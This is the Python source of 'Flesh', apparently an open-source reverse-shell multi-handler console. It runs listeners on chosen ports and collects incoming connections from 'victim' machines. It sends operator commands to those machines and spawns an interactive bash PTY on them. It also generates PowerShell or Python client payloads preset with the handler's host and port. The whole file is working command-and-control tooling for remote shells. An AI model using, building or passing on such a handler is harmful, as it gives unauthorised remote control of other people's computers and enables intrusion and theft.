import socket
import threading
import argparse
import sys
import os
from datetime import datetime

all_conn = []
all_add = []
active_listeners = {} 
LOG_DIR = None

def print_banner():
    banner = r"""
  █████▒██▓    ▓█████   ██████  ██░ ██ 
▓██   ▒▓██▒    ▓█   ▀ ▒██    ▒ ▓██░ ██▒
▒████ ░▒██░    ▒███   ░ ▓██▄   ▒██▀▀██░
░▓█▒  ░▒██░    ▒▓█  ▄   ▒   ██▒░▓█ ░██ 
░▒█░   ░██████▒░▒████▒▒██████▒▒░▓█▒░██▓
 ▒ ░   ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
 ░       ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░ ▒ ░▒░ ░
 ░ ░       ░ ░      ░   ░  ░  ░   ░  ░░ ░
           ░  ░   ░  ░      ░   ░  ░  ░
    """
    print(banner)
    print("      -- Flesh Multi-Handler Console --")
    print("    Github: https://github.com/vibebhavv/Flesh\n")

def write_log(session_id, ip, data, direction="IN"):
    if not LOG_DIR: return
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_file = os.path.join(LOG_DIR, f"session_{session_id}_{ip}.txt")
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] [{direction}] {data}\n")

def send_victim_cmd(conn, ip, shell_type, session_id):
    print(f"[*] Mode: {shell_type.upper()} | ID: {session_id}")
    print("[*] Type 'quit_sh' to return to console.")
    
    if shell_type == "pty":
        conn.send(str.encode("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"))

    stop_session = threading.Event()
    shell_ready = threading.Event()
    shell_ready.set() 

    def receiver_thread(connection):
        """Background thread to constantly read from the socket."""
        connection.settimeout(1.0)
        while not stop_session.is_set():
            try:
                data = connection.recv(40960)
                if not data:
                    print("\n[!] Connection closed by remote host.")
                    stop_session.set()
                    break
                
                resp = data.decode('utf-8', errors='ignore')
                write_log(session_id, ip, resp, "IN")
                
                sys.stdout.write(resp)
                sys.stdout.flush()
                
                shell_ready.set()
            except socket.timeout:
                continue
            except Exception as e:
                if not stop_session.is_set():
                    print(f"\n[!] Receiver Error: {e}")
                break

    # Start the background receiver
    t = threading.Thread(target=receiver_thread, args=(conn,), daemon=True)
    t.start()

    # Main thread handles User Input
    while not stop_session.is_set():
        try:
            shell_ready.wait(timeout=1.5)
            shell_ready.clear()

            cmd = input("").strip()
            
            if not cmd:
                conn.send(b"\n")
                shell_ready.set()
                continue
            
            if cmd == 'quit_sh':
                stop_session.set()
                break

            # --- SEND COMMAND ---
            write_log(session_id, ip, cmd, "OUT")
            conn.send(str.encode(cmd + "\n"))

        except (KeyboardInterrupt, EOFError):
            stop_session.set()
            break
        except Exception as e:
            print(f"\n[!] Sender Error: {e}")
            stop_session.set()
            break
            
    print(f"\n[*] Exiting session {session_id}...")

def start_flesh(host):
    current_context = None 
    shell_mode = "tty"
    while True:
        p = f"flesh (listener/{current_context})[{shell_mode}]> " if current_context else f"flesh [{shell_mode}]> "
        try:
            cmd = input(p).strip().lower()
            if cmd == "ls": list_conn(current_context)
            elif cmd.startswith("set shell "):
                try:
                    mode = cmd.split(" ")[2]
                    if mode in ["tty", "pty"]: 
                        shell_mode = mode
                        print(f"[*] Shell: {mode.upper()}")
                except: print("[ERR] Usage: set shell <tty/pty>")
            elif cmd.startswith("sl "):
                try:
                    idx = int(cmd.split(" ")[1])
                    send_victim_cmd(all_conn[idx], all_add[idx][0], shell_mode, idx)
                except: print("[ERR] Usage: sl <id>")
            elif cmd == "help":
                print("""
    COMMAND             DESCRIPTION
    -------             -----------
    ls                  List active sessions
    sl <id>             Select session for interaction
    kill <id>           Terminate a specific client
    set shell <type>    Switch between 'tty' and 'pty'
    use <port>          Focus on a specific listener
    back                Unfocus listener
    listen <port>       Start a new listener dynamically
    listeners           Display all active ports
    kill listener <p>   Stop a listener port
    clear               Clear the screen
    exit                Shutdown server
                """)
            elif cmd.startswith("use "):
                try:
                    port = int(cmd.split(" ")[1])
                    if port in active_listeners: current_context = port
                    else: print(f"[ERR] Listener {port} inactive.")
                except: print("[ERR] Usage: use <port>")
            elif cmd == "back": current_context = None
            elif cmd.startswith("listen "):
                try: 
                    port = int(cmd.split(" ")[1])
                    socket_setup(host, port)
                except: print("[ERR] Usage: listen <port>")
            elif cmd.startswith("kill "):
                if "listener" in cmd:
                    try:
                        p_kill = int(cmd.split(" ")[2])
                        kill_listener(p_kill)
                        if current_context == p_kill: current_context = None
                    except: print("[ERR] Usage: kill listener <port>")
                else:
                    try: 
                        idx = int(cmd.split(" ")[1])
                        kill_client(idx)
                    except: print("[ERR] Usage: kill <id>")
            elif cmd == "listeners":
                print(f"\n{'PORT':<10} {'INTERFACE':<15} {'SESSIONS':<10}")
                print("-" * 35)
                for port, info in active_listeners.items():
                    print(f"{port:<10} {info['host']:<15} {info['clients']:<10}")
            elif cmd == "clear": os.system('clear' if os.name == 'posix' else 'cls')
            elif cmd == "exit": os._exit(0)
            elif cmd:
                print("[!] Invalid command, type (help) for available commands.")
        except KeyboardInterrupt: os._exit(0)

def kill_listener(port):
    if port in active_listeners:
        try:
            active_listeners[port]['socket'].close()
            del active_listeners[port]
            print(f"[-] Listener on port {port} stopped.")
        except Exception as e: print(f"[ERR] Error: {e}")
    else: print(f"[ERR] No listener on port {port}.")

def kill_client(idx):
    try:
        target_conn = all_conn[idx]
        target_addr = all_add[idx]
        target_conn.close()
        l_port = target_addr[2]
        if l_port in active_listeners:
            active_listeners[l_port]['clients'] -= 1
        del all_conn[idx]
        del all_add[idx]
        print(f"[!] Session {idx} ({target_addr[0]}) terminated.")
    except: print("[ERR] Invalid session ID.")

def accept_conn(soc, port): 
    while True:
        try:
            conn, addr = soc.accept()
            conn.setblocking(1)
            all_conn.append(conn)
            all_add.append(addr + (port,)) 
            active_listeners[port]['clients'] += 1
            sid = len(all_conn) - 1
            print(f"\n[+] New Connection: {addr[0]} on Port {port} (ID: {sid})")
            if LOG_DIR: write_log(sid, addr[0], f"--- Session Started ---", "INFO")
            print("flesh> ", end="", flush=True)
        except: break

def list_conn(filter_port=None):
    print(f"\n{'ID':<5} {'IP ADDRESS':<18} {'REMOTE PORT':<12} {'LOCAL PORT':<15}")
    print("-" * 55)
    for i in range(len(all_conn)):
        try:
            if filter_port and all_add[i][2] != filter_port: continue
            all_conn[i].send(str.encode(' ')) 
            print(f"{i:<5} {all_add[i][0]:<18} {all_add[i][1]:<12} {all_add[i][2]:<15}")
        except:
            del all_conn[i]
            del all_add[i]
            if filter_port: active_listeners[filter_port]['clients'] -= 1
            continue
    print("")

def generate_client(gen_type, host, port):
    target_host = host if host and host != '0.0.0.0' else "127.0.0.1"
    
    template_path = f"assets/template_{gen_type}.txt"
    output_ext = "ps1" if gen_type == "ps" else "py"
    output_file = f"payload_{port}.{output_ext}"

    if not os.path.exists(template_path):
        print(f"[ERR] Template not found: {template_path}")
        return

    try:
        with open(template_path, "r") as f:
            template = f.read()

        payload = template.replace("{host}", target_host).replace("{port}", str(port))

        with open(output_file, "w") as f:
            f.write(payload)
        
        print(f"\n[+] Payload Generated: {output_file}")
        print(f"[*] Configuration: {target_host}:{port}")
        print(f"[*] Type: {gen_type.upper()}")
        
    except Exception as e:
        print(f"[ERR] Generation failed: {e}")

def socket_setup(host, port): 
    if port in active_listeners:
        print(f"[!] Listener on port {port} is already active.")
        return
    try:
        soc = socket.socket()
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.bind((host, port))
        soc.listen(5)
        
        active_listeners[port] = {
            'socket': soc, 
            'clients': 0, 
            'host': host or '0.0.0.0'
        }
        
        t = threading.Thread(target=accept_conn, args=(soc, port))
        t.daemon = True
        t.start()
        print(f"[*] Started listener on port: {port}")
    except socket.error as err_msg:
        print(f"[ERR] Could not start listener on port {port}: {err_msg}")

def main():
    global LOG_DIR
    print_banner() 
    
    parser = argparse.ArgumentParser(description="Flesh Handler")
    parser.add_argument("-p", "--ports", type=str, default="8786")
    parser.add_argument("-l", "--host", type=str, default="")
    parser.add_argument("-g", "--generate", type=str, choices=['ps', 'py'], help="Generate client script (ps/py)")
    parser.add_argument("--log", type=str, help="Folder for session logs")
    args = parser.parse_args()
    
    if args.log:
        LOG_DIR = args.log
        if not os.path.exists(LOG_DIR): os.makedirs(LOG_DIR)
        
    port_list = [int(p.strip()) for p in args.ports.split(",")]
    
    if args.generate:
        generate_client(args.generate, args.host, port_list[0])

    for p in port_list: 
        socket_setup(args.host, p)
    
    start_flesh(args.host)

if __name__ == "__main__":
    main()
